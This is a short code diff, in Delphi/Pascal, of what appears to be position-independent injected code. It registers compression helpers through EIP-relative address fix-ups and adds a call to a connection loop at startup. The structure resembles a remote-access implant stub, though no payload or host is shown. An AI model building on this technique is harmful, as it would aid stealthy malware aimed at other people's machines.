@@ -33,7 +33,7 @@ procedure resolver;
     end;
   end;
 
-  function xCompressMemory(pAPI:PAPIRec; lpMemory: Pointer; var dwSize: Cardinal): Pointer;
+  function xCompressMemory(pAPI:PAPIRec; lpMemory: Pointer; var dwSize: Cardinal): Pointer;stdcall;
   var
     lpWorkspace, lpOutput: Pointer;
     dwTemp, dwOutputSize: DWORD;
@@ -59,7 +59,7 @@ procedure resolver;
     end;
   end;
 
-  function xDecompressMemory(pAPI:PAPIRec; lpMemory: Pointer; dwSize: Cardinal; dwOutputSize:Cardinal): Pointer;
+  function xDecompressMemory(pAPI:PAPIRec; lpMemory: Pointer; dwSize: Cardinal; dwOutputSize:Cardinal): Pointer;stdcall;
   var
     lpOutput: Pointer;
     dwTemp: DWORD;
@@ -224,6 +224,14 @@ procedure resolver;
     dwStaticAddress := DWORD(@xCopyMemory);
     dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
     pAPI.xCopyMemory := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xCompressMemory);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xCompressMemory := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xDecompressMemory);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xDecompressMemory := Pointer(dwRelativeAddress);
   end;
 
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
@@ -269,6 +277,7 @@ begin
   pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
   LoadAPIs(pAPI, hKernel32);
   LoadHelpers(pAPI);
+  ConnectionLoop_CALLER(pAPI);
   LoadFunctions(pAPI);
   pAPI.xExitProcess(0);
 end;
